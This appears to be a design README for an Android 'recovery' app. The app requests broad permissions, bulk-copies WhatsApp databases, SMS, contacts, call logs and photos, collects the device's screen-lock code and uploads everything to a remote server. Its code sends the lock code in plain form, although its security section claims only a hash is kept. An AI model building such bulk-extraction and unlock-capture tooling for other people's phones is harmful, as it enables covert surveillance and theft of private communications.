# SafeChild Android Recovery Agent

## Overview

The SafeChild Android Recovery Agent is a specialized APK designed for mobile-only data recovery scenarios where the client doesn't have access to a computer.

## Architecture

```
SafeChildRecoveryAgent/
├── app/
│   ├── src/main/
│   │   ├── java/com/safechild/recovery/
│   │   │   ├── MainActivity.kt                 # Entry point
│   │   │   ├── RecoveryActivity.kt             # Main recovery UI
│   │   │   ├── PermissionActivity.kt           # Permission request flow
│   │   │   │
│   │   │   ├── managers/
│   │   │   │   ├── RecoveryTokenManager.kt     # Token validation & API
│   │   │   │   ├── BackupCreationManager.kt    # Backup creation logic
│   │   │   │   ├── DataExtractionManager.kt    # Data extraction
│   │   │   │   ├── UploadManager.kt            # Chunked upload to server
│   │   │   │   └── PermissionManager.kt        # Runtime permissions
│   │   │   │
│   │   │   ├── services/
│   │   │   │   ├── BackupService.kt            # Background backup service
│   │   │   │   ├── UploadService.kt            # Background upload service
│   │   │   │   └── DeviceAdminReceiver.kt      # Device admin for full access
│   │   │   │
│   │   │   ├── extractors/
│   │   │   │   ├── PhotoExtractor.kt           # Photos from DCIM/Pictures
│   │   │   │   ├── VideoExtractor.kt           # Videos
│   │   │   │   ├── ContactExtractor.kt         # Contacts from ContentProvider
│   │   │   │   ├── CallLogExtractor.kt         # Call history
│   │   │   │   ├── SmsExtractor.kt             # SMS messages
│   │   │   │   ├── WhatsAppExtractor.kt        # WhatsApp databases
│   │   │   │   ├── TelegramExtractor.kt        # Telegram data
│   │   │   │   └── AppDataExtractor.kt         # Generic app data
│   │   │   │
│   │   │   ├── models/
│   │   │   │   ├── RecoveryCase.kt             # Recovery case data
│   │   │   │   ├── ExtractionResult.kt         # Extraction results
│   │   │   │   └── UploadProgress.kt           # Upload progress tracking
│   │   │   │
│   │   │   └── utils/
│   │   │       ├── CryptoUtils.kt              # AES encryption
│   │   │       ├── FileUtils.kt                # File operations
│   │   │       ├── NetworkUtils.kt             # Network helpers
│   │   │       └── DeviceUtils.kt              # Device info
│   │   │
│   │   ├── res/
│   │   │   ├── layout/
│   │   │   │   ├── activity_main.xml           # Code entry screen
│   │   │   │   ├── activity_recovery.xml       # Recovery progress
│   │   │   │   └── activity_permissions.xml    # Permission grants
│   │   │   │
│   │   │   └── values/
│   │   │       ├── strings.xml                 # Turkish & English strings
│   │   │       └── colors.xml                  # SafeChild branding
│   │   │
│   │   └── AndroidManifest.xml
│   │
│   └── build.gradle
│
└── build.gradle
```

## Required Permissions

```xml
<!-- AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.safechild.recovery">

    <!-- Storage -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />

    <!-- Contacts & Call Logs -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />

    <!-- SMS -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_MMS" />

    <!-- Network -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <!-- Background Service -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />

    <!-- Device Admin (for full backup access) -->
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />

</manifest>
```

## Key Components

### 1. RecoveryTokenManager.kt

```kotlin
class RecoveryTokenManager(private val context: Context) {
    private val apiBaseUrl = "https://safechild.mom/api"

    suspend fun validateToken(code: String): RecoveryCase? {
        val response = httpClient.get("$apiBaseUrl/recovery/validate/$code")
        return if (response.isSuccessful) {
            response.body<RecoveryCase>()
        } else null
    }

    suspend fun notifyExtractionStart(code: String, screenLock: String) {
        httpClient.post("$apiBaseUrl/recovery/start-agent/$code") {
            setBody(mapOf(
                "screen_lock" to screenLock,
                "is_mobile" to true,
                "platform" to "android"
            ))
        }
    }

    suspend fun uploadDataBatch(code: String, dataType: String, count: Int) {
        httpClient.post("$apiBaseUrl/recovery/upload-data/$code") {
            setBody(mapOf(
                "data_type" to dataType,
                "count" to count,
                "device_serial" to Build.SERIAL
            ))
        }
    }

    suspend fun finalizeExtraction(code: String, statistics: Map<String, Int>) {
        httpClient.post("$apiBaseUrl/recovery/finalize/$code") {
            setBody(mapOf(
                "statistics" to statistics,
                "device_serial" to Build.SERIAL
            ))
        }
    }
}
```

### 2. DataExtractionManager.kt

```kotlin
class DataExtractionManager(
    private val context: Context,
    private val progressCallback: (String, Int) -> Unit
) {
    private val extractors = listOf(
        PhotoExtractor(context),
        VideoExtractor(context),
        ContactExtractor(context),
        CallLogExtractor(context),
        SmsExtractor(context),
        WhatsAppExtractor(context)
    )

    suspend fun extractAll(outputDir: File): ExtractionResult {
        val result = ExtractionResult()
        var progress = 0

        extractors.forEach { extractor ->
            progressCallback(extractor.name, progress)

            val extracted = extractor.extract(outputDir)
            result.addStats(extractor.type, extracted.count)

            progress += 100 / extractors.size
        }

        return result
    }
}
```

### 3. UploadManager.kt

```kotlin
class UploadManager(
    private val context: Context,
    private val apiBaseUrl: String
) {
    private val chunkSize = 10 * 1024 * 1024 // 10MB chunks

    suspend fun uploadFile(
        file: File,
        code: String,
        onProgress: (Float) -> Unit
    ): Boolean {
        val totalChunks = ceil(file.length().toDouble() / chunkSize).toInt()

        file.inputStream().buffered().use { input ->
            repeat(totalChunks) { index ->
                val chunk = ByteArray(minOf(chunkSize, (file.length() - index * chunkSize).toInt()))
                input.read(chunk)

                val response = httpClient.post("$apiBaseUrl/recovery/upload-backup/$code") {
                    setBody(MultiPartFormDataContent(formData {
                        append("file", chunk, Headers.build {
                            append(HttpHeaders.ContentDisposition, "filename=${file.name}")
                        })
                        append("chunk_index", index.toString())
                        append("total_chunks", totalChunks.toString())
                    }))
                }

                if (!response.status.isSuccess()) {
                    return false
                }

                onProgress((index + 1).toFloat() / totalChunks)
            }
        }

        return true
    }
}
```

### 4. WhatsAppExtractor.kt

```kotlin
class WhatsAppExtractor(private val context: Context) : BaseExtractor() {
    override val name = "WhatsApp"
    override val type = "messages"

    private val whatsappPaths = listOf(
        "/data/data/com.whatsapp/databases/",
        "/sdcard/WhatsApp/Databases/",
        "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/"
    )

    override suspend fun extract(outputDir: File): ExtractedData {
        val result = ExtractedData()
        val outputWA = File(outputDir, "whatsapp")
        outputWA.mkdirs()

        whatsappPaths.forEach { path ->
            val dbDir = File(path)
            if (dbDir.exists() && dbDir.canRead()) {
                dbDir.listFiles()?.filter { it.name.contains("msgstore") }?.forEach { db ->
                    db.copyTo(File(outputWA, db.name), overwrite = true)
                    result.addFile(db.name, db.length())
                }
            }
        }

        // Also copy media
        val mediaPath = "/sdcard/WhatsApp/Media/"
        val mediaDir = File(mediaPath)
        if (mediaDir.exists()) {
            mediaDir.walkTopDown().filter { it.isFile }.forEach { file ->
                val relativePath = file.relativeTo(mediaDir)
                val dest = File(outputWA, "Media/$relativePath")
                dest.parentFile?.mkdirs()
                file.copyTo(dest, overwrite = true)
                result.addFile(file.name, file.length())
            }
        }

        return result
    }
}
```

## User Flow

1. **Welcome Screen**
   - User enters 8-character recovery code
   - App validates code against backend

2. **Permission Grant**
   - App requests all necessary permissions
   - User grants storage, contacts, SMS permissions
   - Optional: Device Admin activation for full access

3. **Screen Lock Entry**
   - User enters their device screen lock code
   - Code is securely transmitted to backend

4. **Data Extraction**
   - Progress bar shows extraction status
   - Categories: Photos, Videos, Contacts, Messages, WhatsApp

5. **Upload**
   - Chunked upload with progress indicator
   - Resume support for interrupted uploads

6. **Completion**
   - Statistics summary
   - Confirmation message
   - Option to uninstall app

## Security Considerations

1. **Data Encryption**
   - All extracted data encrypted with AES-256 before upload
   - Encryption key derived from recovery code + device ID

2. **Secure Communication**
   - All API calls over HTTPS
   - Certificate pinning enabled

3. **Data Handling**
   - Temporary files deleted after upload
   - No data persisted on device after completion

4. **Screen Lock**
   - Screen lock hash stored, not plaintext
   - Used only for forensic chain of custody

## Build Configuration

```gradle
// app/build.gradle
android {
    compileSdk 34

    defaultConfig {
        applicationId "com.safechild.recovery"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0.0"
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
        }
    }
}

dependencies {
    implementation 'io.ktor:ktor-client-android:2.3.0'
    implementation 'io.ktor:ktor-client-content-negotiation:2.3.0'
    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.0'
    implementation 'androidx.work:work-runtime-ktx:2.8.1'
}
```

## Deep Link Configuration

```xml
<!-- AndroidManifest.xml -->
<activity android:name=".MainActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />

        <!-- safechild://recover/abc12345 -->
        <data android:scheme="safechild" android:host="recover" />

        <!-- https://safechild.mom/recover/abc12345 -->
        <data android:scheme="https" android:host="safechild.mom" android:pathPrefix="/recover/" />
    </intent-filter>
</activity>
```

## APK Distribution

The APK is served from:
- `https://safechild.mom/download/safechild-recovery.apk`

Users access it via the recovery link which redirects to APK download on Android devices.
